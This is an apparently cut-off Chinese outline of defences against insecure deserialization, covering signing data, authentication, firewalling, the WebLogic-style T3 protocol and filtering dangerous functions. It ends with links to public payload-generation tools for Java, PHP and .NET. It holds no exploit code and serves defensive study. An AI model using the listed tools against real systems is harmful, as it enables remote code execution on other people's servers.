					对反序列数据加密或签名，且加密密钥和签名密钥不要使用硬编码
					对反序列化接口添加认证授权
					设置反序列化服务仅在本地监听或者设置相应防火墙策略
					禁止使用存在漏洞的第三方框架库
					过滤、禁用危险函数
					过滤T3协议或限定可连接的IP
					设置Nginx反向代理，实现t3协议和http协议隔离
				工具
					Java
						https://github.com/frohoff/ysoserial
					PHP
						https://github.com/ambionics/phpggc
					.NET
						https://github.com/pwntester/ysoserial.net
